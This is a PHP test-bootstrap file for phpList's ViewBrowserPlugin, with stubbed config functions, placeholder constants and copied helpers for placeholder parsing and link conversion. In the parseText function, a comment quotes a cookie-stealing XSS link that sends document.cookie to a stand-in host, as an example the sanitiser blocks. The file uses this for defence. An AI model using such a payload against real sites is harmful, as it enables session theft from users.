<?php
define('PHPLISTINIT', 1);
define("PLUGIN_ROOTDIR","/home/duncan/www/upload");
define("PLUGIN_ROOTDIRS",
   "/home/duncan/Development/GitHub/phplist-plugin-common/plugins"
. ";/home/duncan/Development/GitHub/phplist-plugin-viewbrowser/plugins"
);
define('EMAILTEXTCREDITS', true);
define('ALWAYS_ADD_USERTRACK', true);
define('CLICKTRACK', true);
define('XORmask', '6f409c5681427eeaaaaa495797642e4b');
define('SIGN_WITH_HMAC', true);
define('HMACKEY', '1234567890123456');
define('HASH_ALGO', 'sha256');

$GLOBALS['systemroot'] = '/home/duncan/Development/GitHub/phplist3/public_html/lists';
$GLOBALS['public_scheme'] = 'http';
$GLOBALS['pageroot'] = '/lists';
$GLOBALS['website'] = 'mysite.com';
$GLOBALS['domain'] = 'mysite.com';
$GLOBALS['strUnsubscribe'] = 'unsubscribe';
$GLOBALS['strThisLink'] = 'this link';
$GLOBALS['strForward'] = 'Forward to a friend';
$GLOBALS['PoweredByText'] = 'Powered by phplist';
$GLOBALS['PoweredByImage'] = 'mysite.com';
$GLOBALS['strForwardTitle'] = 'Forward a Message to Someone';
$GLOBALS['strToUnsubscribe'] = 'If you do not want to receive any more newsletters, ';
$GLOBALS['strToUpdate'] = 'To update your preferences and to unsubscribe visit';

$_GET['pi'] = 'ViewBrowserPlugin';

include '/home/duncan/Development/GitHub/phplist-plugin-viewbrowser/plugins/ViewBrowserPlugin.php';
$pi = new ViewBrowserPlugin();
$pi->activate();

$GLOBALS['plugins'] = [
    'ViewBrowserPlugin' => $pi,
];
include '/home/duncan/Development/GitHub/phplist-plugin-common/plugins/CommonPlugin/Autoloader.php';

class phplistPlugin
{
    public function __construct()
    {
    }

    public function activate()
    {
    }

    public function setFinalDestinationEmail()
    {
    }
}

function s($text)
{
    if (func_num_args() > 1) {
        $args = func_get_args();
        array_shift($args);
        $text = vsprintf($text, $args);
    }
    return $text;
}

function cleanUrl($p)
{
    return $p;
};

function getConfig($key) {
    switch ($key) {
        case 'version':
            return '3.3.0';
            break;
        case 'website':
            return 'mysite.com';
            break;
        case 'viewbrowser_link':
            return 'View in your browser';
            break;
        case 'viewbrowser_attributes':
            return '';
            break;
        case 'viewbrowser_plugins':
            return "ContentAreas\nconditionalPlaceholderPlugin\nRssFeedPlugin\nViewBrowserPlugin";
            break;
        case 'viewbrowser_anonymous':
            return false;
            break;
        case 'viewbrowser_archive_link':
            return 'archive';
            break;
        case 'viewbrowser_archive_styles':
            return '';
            break;
        case 'html_email_style':
            return '<style></style>';
            break;
        case 'subscribeurl':
            return '';
            break;
        case 'unsubscribeurl':
            return 'http://mysite.com/lists/?p=unsubscribe';
            break;
        case 'preferencesurl':
            return 'http://mysite.com/lists/?p=preferences';
            break;
        case 'forwardurl':
            return 'http://mysite.com/lists/?p=forward';
            break;
        case 'confirmationurl':
            return '';
            break;
        case 'blacklisturl':
            return '';
            break;
        default:
            throw new Exception("config $key missing");
    }
};
function parsePlaceHolders($content, $array = array())
{
  foreach ($array as $key => $val) {
    $array[strtoupper($key)] = $val;
    $array[htmlentities(strtoupper($key),ENT_QUOTES,'UTF-8')] = $val;
    $array[str_ireplace(' ','&nbsp;',strtoupper($key))] = $val;
  }

  foreach ($array as $key => $val) {
    #  print '<br/>'.$key.' '.$val.'<hr/>'.htmlspecialchars($content).'<hr/>';
      if (stripos($content,'['.$key.']') !== false) {
        $content = str_ireplace('['.$key.']',$val,$content);
      } 
      if (preg_match('/\['.$key.'%%([^\]]+)\]/i',$content,$regs)) { ## @@todo, check for quoting */ etc
    #    var_dump($regs);
        if (!empty($val)) {
          $content = str_ireplace($regs[0],$val,$content);
        } else {
          $content = str_ireplace($regs[0],$regs[1],$content);
        }
      }
  }
  return $content;
}

function addHTMLFooter($message,$footer) {
  if (preg_match('#</body>#i',$message)) {
    $message = preg_replace('#</body>#i',$footer.'</body>',$message);
  } else {
    $message .= $footer;
  }
  return $message;
}

function parseLogoPlaceholders($content) {
    ## replace Logo placeholders
    preg_match_all('/\[LOGO\:?(\d+)?\]/', $content, $logoInstances);
    foreach ($logoInstances[0] as $index => $logoInstance) {
        $size = sprintf('%d', $logoInstances[1][$index]);
        if (!empty($size)) {
            $logoSize = $size;
        } else {
            $logoSize = '500';
        }
        //~ createCachedLogoImage($logoSize);
        $content = str_replace($logoInstance, 'ORGANISATIONLOGO'.$logoSize.'.png', $content);
    }
    return $content;
}

function parseText($text)
{
    # bug in PHP? get rid of newlines at the beginning of text
    $text = ltrim($text);

    # make urls and emails clickable
    $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i", '<a href="mailto:\\1" class="email">\\1</a>', $text);
    $link_pattern = "/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

    $i = 0;
    while (preg_match($link_pattern, $text, $matches)) {
        $url = $matches[2];
        $rest = $matches[3];
        if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
            # avoid this
            #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
            $url = preg_replace('/:/', '', $url);
        }
        $link[$i] = '<a href="' . $url . '" ' . $rest . '>' . $matches[4] . '</a>';
        $text = $matches[1] . "%%$i%%" . $matches[5];
        ++$i;
    }

    $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", 'http://\\1', $text);#make www. -> http://www.
    $text = preg_replace("/(https?:\/\/)http?:\/\//i", '\\1', $text);#take out duplicate schema
    $text = preg_replace("/(ftp:\/\/)http?:\/\//i", '\\1', $text);#take out duplicate schema
    $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i",
        '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
        $text); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

    $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i",
        '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
        $text); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

    # take off a possible last full stop and move it outside
    $text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i",
        '<a href="\\1" class="url" target="_blank">\\2</a>.', $text);

    for ($j = 0; $j < $i; ++$j) {
        $replacement = $link[$j];
        $text = preg_replace("/\%\%$j\%\%/", $replacement, $text);
    }

    # hmm, regular expression choke on some characters in the text
    # first replace all the brackets with placeholders.
    # we cannot use htmlspecialchars or addslashes, because some are needed

    $text = str_replace("\(", '<!--LB-->', $text);
    $text = str_replace("\)", '<!--RB-->', $text);
    $text = preg_replace('/\$/', '<!--DOLL-->', $text);

    # @@@ to be xhtml compabible we'd have to close the <p> as well
    # so for now, just make it two br/s, which will be done by replacing
    # \n with <br/>
#  $paragraph = '<p class="x">';
    $br = '<br />';
    $text = preg_replace("/\r/", '', $text);
    $text = preg_replace("/\n/", "$br\n", $text);

    # reverse our previous placeholders
    $text = str_replace('<!--LB-->', '(', $text);
    $text = str_replace('<!--RB-->', ')', $text);
    $text = str_replace('<!--DOLL-->', '$', $text);

    return $text;
}

